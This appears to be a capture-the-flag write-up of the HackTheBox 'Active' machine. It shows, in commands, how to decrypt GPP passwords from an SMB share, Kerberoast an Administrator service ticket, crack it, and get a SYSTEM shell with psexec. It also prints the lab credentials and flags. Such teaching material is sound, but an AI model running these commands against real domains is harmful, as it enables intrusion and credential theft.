---
title: "Active"
seoTitle: "Kerberos Hacking"
seoDescription: "Learn Active Directory exploitation using Kerberos, SMB, and GPP for flag capture via enumeration, decryption, and privilege escalation techniques"
datePublished: Fri Feb 07 2025 19:18:37 GMT+0000 (Coordinated Universal Time)
cuid: cm6v5gd8p000o08l8ger00ju0
slug: active
cover: https://cdn.hashnode.com/res/hashnode/image/upload/v1738950181802/979de08e-65cd-49c7-82cb-83c1d9bd8e56.webp
tags: hacking, active-directory, ctf, hackthebox, cybersecurity-1, kerberos

---

IP: **10.129.40.252**

Let’s start with the nmap scan

```bash
nmap -sC -sV -o nmap 10.129.40.252
```

```bash
Starting Nmap 7.95 ( https://nmap.org ) at 2025-02-07 12:40 EST
Nmap scan report for 10.129.40.252
Host is up (0.27s latency).
Not shown: 983 closed tcp ports (reset)
PORT      STATE SERVICE       VERSION
53/tcp    open  domain        Microsoft DNS 6.1.7601 (1DB15D39) (Windows Server 2008 R2 SP1)
| dns-nsid: 
|_  bind.version: Microsoft DNS 6.1.7601 (1DB15D39)
88/tcp    open  kerberos-sec  Microsoft Windows Kerberos (server time: 2025-02-07 17:41:09Z)
135/tcp   open  msrpc         Microsoft Windows RPC
139/tcp   open  netbios-ssn   Microsoft Windows netbios-ssn
389/tcp   open  ldap          Microsoft Windows Active Directory LDAP (Domain: active.htb, Site: Default-First-Site-Name)
445/tcp   open  microsoft-ds?
464/tcp   open  kpasswd5?
593/tcp   open  ncacn_http    Microsoft Windows RPC over HTTP 1.0
636/tcp   open  tcpwrapped
3268/tcp  open  ldap          Microsoft Windows Active Directory LDAP (Domain: active.htb, Site: Default-First-Site-Name)
3269/tcp  open  tcpwrapped
49152/tcp open  msrpc         Microsoft Windows RPC
49153/tcp open  msrpc         Microsoft Windows RPC
49154/tcp open  msrpc         Microsoft Windows RPC
49155/tcp open  msrpc         Microsoft Windows RPC
49157/tcp open  ncacn_http    Microsoft Windows RPC over HTTP 1.0
49158/tcp open  msrpc         Microsoft Windows RPC
Service Info: Host: DC; OS: Windows; CPE: cpe:/o:microsoft:windows_server_2008:r2:sp1, cpe:/o:microsoft:windows

Host script results:
| smb2-time: 
|   date: 2025-02-07T17:42:10
|_  start_date: 2025-02-07T17:38:10
| smb2-security-mode: 
|   2:1:0: 
|_    Message signing enabled and required

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 113.33 seconds
```

We can see that there are multiple ports open here but what highlights is that `port 88 kerberos` which indicates that it’s an Active Directory machine, `port 389 ldap` which shows us the domain name which is `active.htb` and `port 445 smb` open. So, let’s first add `active.htb` into our host file.

```bash
sudo nano /etc/hosts
```

![](https://cdn.hashnode.com/res/hashnode/image/upload/v1738950518143/15971b38-823e-4a04-b75c-759fe9ac30cb.png align="center")

Now, since we have SMB open let’s start by looking into it.

```bash
smbmap -H 10.129.40.252
```

![](https://cdn.hashnode.com/res/hashnode/image/upload/v1738951592112/4f2ec27c-05c5-4e42-bcd2-6df8016b7935.png align="center")

We have an anonymous login enabled and also we have access to read the contents to `Replication` share let’s look at the contents present in the share using `smbclient`.

```bash
smbclient \\\\10.129.40.252\\Replication
```

![](https://cdn.hashnode.com/res/hashnode/image/upload/v1738951121374/81a1bd76-88f5-48a6-bf2a-032ccbe77c2d.png align="center")

So, we have an `active.htb` folder here let’s download the complete folder. First, we need to enable recursive operations which will allow us to perform operations on all files and subdirectories using `RECURSE ON` next, we’ll disable the interactive prompt which will allow us to execute commands in batch mode using `PROMPT OFF` and lastly `mget *` to get all the files inside `active.htb` folder.

```bash
RECURSE ON
PROMPT OFF
mget *
```

![](https://cdn.hashnode.com/res/hashnode/image/upload/v1738952170329/5e46826a-07be-4c60-9e1a-23f4b11f0964.png align="center")

It has downloaded a couple of files, let’s take a look at it in a much simpler view.

```bash
tree actve.htb
```

![](https://cdn.hashnode.com/res/hashnode/image/upload/v1738952637080/2f3f61e3-d953-48d2-9f94-731b2db5b8dc.png align="center")

Inside `group policy/preferences` we have a `group.xml` file. Doing some google search we found out that `The Groups.xml file is part of the Group Policy Preferences (GPP) feature in Windows. It stores group membership information for users and groups.` We can possibly find creds in this file. So, let’s take a look at the contents inside it.

```bash
cat Groups.xml
```

![](https://cdn.hashnode.com/res/hashnode/image/upload/v1738953107294/b29674c8-b059-4414-98c1-6615fe80412a.png align="center")

```xml
<?xml version="1.0" encoding="utf-8"?>
<Groups clsid="{3125E937-EB16-4b4c-9934-544FC6D24D26}"><User clsid="{DF5F1855-51E5-4d24-8B1A-D9BDE98BA1D1}" name="active.htb\SVC_TGS" image="2" changed="2018-07-18 20:46:06" uid="{EF57DA28-5F69-4530-A59E-AAB58578219D}"><Properties action="U" newName="" fullName="" description="" cpassword="edBSHOwhZLTjt/QS9FeIcJ83mjWA98gw9guKOhJOdcqh+ZGMeXOsQbCpZ3xUjTLfCuNH8pG5aSVYdYw/NglVmQ" changeLogon="0" noChange="1" neverExpires="1" acctDisabled="0" userName="active.htb\SVC_TGS"/></User>
</Groups>
```

We got the username and an encrypted password so we have a tool `gpp-decryptor` that uses the publicly disclosed key to decrypt any given GPP encrypted string.

```bash
gpp-decrypt edBSHOwhZLTjt/QS9FeIcJ83mjWA98gw9guKOhJOdcqh+ZGMeXOsQbCpZ3xUjTLfCuNH8pG5aSVYdYw/NglVmQ
```

![](https://cdn.hashnode.com/res/hashnode/image/upload/v1738953766620/ccd1a13d-60f6-47ae-832f-2f121b7b35db.png align="center")

So, we got the username `SVC_TGS` and the password `GPPstillStandingStrong2k18`. Now, let’s check with these creds if we can read any more shares.

```bash
smbmap -d active.htb -u SVC_TGS -p GPPstillStandingStrong2k18 -H 10.129.40.252
```

![](https://cdn.hashnode.com/res/hashnode/image/upload/v1738953947625/017058b9-69ef-4c30-a79a-1402082e6b91.png align="center")

We have read-only access to the Users folder let’s enumerate it.

```bash
smbclient \\\\10.129.40.252\\Users -U active.htb/SVC_TGS%GPPstillStandingStrong2k18
```

![](https://cdn.hashnode.com/res/hashnode/image/upload/v1738954086456/5fff1edc-12cb-46a6-a31c-a1216d229f59.png align="center")

Looking at the `SVC_TGS` user first.

![](https://cdn.hashnode.com/res/hashnode/image/upload/v1738954153036/c12d632b-d5b6-43a2-81f6-353e332bf610.png align="center")

And we got our first flag here.

```bash
cat user.txt
```

![](https://cdn.hashnode.com/res/hashnode/image/upload/v1738954354961/b20df80c-4191-40d3-8830-427b207c0983.png align="center")

Flag: ***e65c47a4bed41941a1b506f8d6593c76***

We compromised a low-privileged user. Now we need to escalate privileges.

As we are dealing with Active Directory, Kerberos is a network authentication protocol that is used to securely authenticate users to network services. It is a ticket-based protocol, which means that users are authenticated by presenting a ticket that has been issued by a trusted authority.

The three main components of Kerberos are:

* The Key Distribution Center (KDC): The KDC is the central authority that issues tickets and manages the Kerberos database.
    
* The Authentication Service (AS): The AS is responsible for issuing tickets to users.
    
* The Ticket Granting Service (TGS): The TGS is responsible for issuing tickets to services.
    

![](https://miro.medium.com/v2/resize:fit:633/0*VekV2SHYhiRct1_S.png align="left")

Here is an example of how Kerberos works:

1. A user wants to access a network service.
    
2. The user’s computer sends a request to the KDC.
    
3. The KDC issues a ticket to the user.
    
4. The user’s computer sends the ticket to the service.
    
5. The service verifies the ticket and grants the user access.
    

Kerberos is a secure protocol because it uses encryption to protect the tickets. This means that even if an attacker intercepted a ticket, they would not be able to use it to authenticate themselves to the service.

Kerberos is a widely used protocol and is supported by many operating systems and applications. It is a key component of many enterprise security solutions.

If you compromise a user that has a valid Kerberos ticket-granting ticket (TGT), then you can request one or more ticket-granting service (TGS) service tickets for any Service Principal Name (SPN) from a domain controller.

A portion of the TGS ticket is encrypted with the hash of the service account associated with the SPN. Therefore, you can run an offline brute force attack on the encrypted portion to reveal the service account password. Therefore, if you request an administrator account TGS ticket and the administrator is using a weak password, we’ll be able to crack it!

We’ll be using Impacket to work on this.

```bash
impacket-GetUserSPNs -request -outputfile kerberoastable.txt -dc-ip 10.129.40.252 'active.htb/SVC_TGS:GPPstillStandingStrong2k18'
```

![](https://cdn.hashnode.com/res/hashnode/image/upload/v1738954887080/09fbeea1-2170-4877-ac15-ce48f6f976ad.png align="center")

We were able to request a TGS from an Administrator SPN. If we can crack the TGS, we’ll be able to escalate privileges!

```bash
john --wordlist=/usr/share/eaphammer/wordlists/rockyou.txt kerberoastable.txt
```

![](https://cdn.hashnode.com/res/hashnode/image/upload/v1738955234439/6cd801b5-a8d6-4988-a9b2-a36faa826f60.png align="center")

We got the password `Ticketmaster1968`. Now, as we have Adminisrator password let’s use psexec to get a shell.

```bash
impacket-psexec active.htb/Administrator:'Ticketmaster1968'@10.129.40.252
```

![](https://cdn.hashnode.com/res/hashnode/image/upload/v1738955415597/5f8a503f-202f-4cc3-a097-0fa24b3add5d.png align="center")

We’re into the DC as `nt authority\system` let’s get our root flag.

![](https://cdn.hashnode.com/res/hashnode/image/upload/v1738955513631/562ff4d3-01f1-4b9a-92f8-7a6c1ac8a348.png align="center")

Flag: ***5d166f474bec2e3241eeda8fd0e6d6be***

![](https://cdn.hashnode.com/res/hashnode/image/upload/v1738955633733/71639e38-71e1-4eb3-8b4a-a54dd43db166.png align="center")